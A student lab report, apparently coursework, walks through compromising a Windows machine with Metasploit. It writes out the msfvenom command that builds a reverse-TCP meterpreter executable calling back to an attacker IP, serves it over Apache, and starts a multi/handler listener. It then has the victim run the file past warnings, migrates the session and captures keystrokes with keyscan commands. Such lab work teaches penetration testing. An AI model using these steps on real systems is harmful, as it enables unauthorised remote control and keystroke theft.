## Register number : 212222110054
## Name : Vishnupriya R

# Compromising-windows-using-Metasploit

## Metasploit
Compromising windows using Metasploit

## AIM:
To Compromise windows using Metasploit .

## DESIGN STEPS:
Step 1:
Install kali linux either in partition or virtual box or in live mode

Step 2:
Investigate on the various categories of tools as follows:

Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

### OUTPUT:
![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/e3b4e8ad-0744-41da-bf0e-00af2819b316)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

### OUTPUT:
![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/e5f93487-fe4d-4ca2-ae87-40528759b8ca)


copy the fun.exe into the apache /var/www/html folder

### OUTPUT:
![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/a7061eec-78cb-4924-8bfd-750819217ae4)

Start apache server sudo systemctl apache2 start

### OUTPUT:
![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/94f19b88-677c-4e52-9f3e-9c0692c1b517)

Check the status of apache2

### OUTPUT:
![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/b0acfb58-3df4-4054-94b9-cbee552a7016)

Invoke msfconsole:

### OUTPUT:
msfconsole

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/44262e98-e486-48b5-ac0b-a46ce64aea0e)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole. 

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/df212ae7-e067-4020-8c25-1c0aa43b59e7)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/8e273f1c-0127-4bf3-84fb-fb78e9c6ac90)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/70a3b4d8-0dcc-4370-9fcd-2c3677d0895e)

Bypass any warning boxes, double-click the file, and allow it to run. 

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/e8a7eea1-3cc6-4ecb-958f-fde637a7fae8)

On kali give the command exploit 

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/65425abf-0758-4378-8135-3ff71f48e582)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/5d0014c5-4c05-4600-9961-06a15007e0f3)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/f67156a4-303a-46e8-988b-f6cfedf969a8)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/e6b6fbc1-4c4c-4e14-a3d8-10249cff2969)

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/a33bbc37-38ac-45b3-b0a3-fd26b82ed9ab)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Yamunaasri/Compromising-windows-using-Metasploit/assets/115707860/4f311cb3-83cd-4564-a90b-590e1397a284)

## RESULT:
The Metasploit framework is used to compromise windows and is examined successfully.
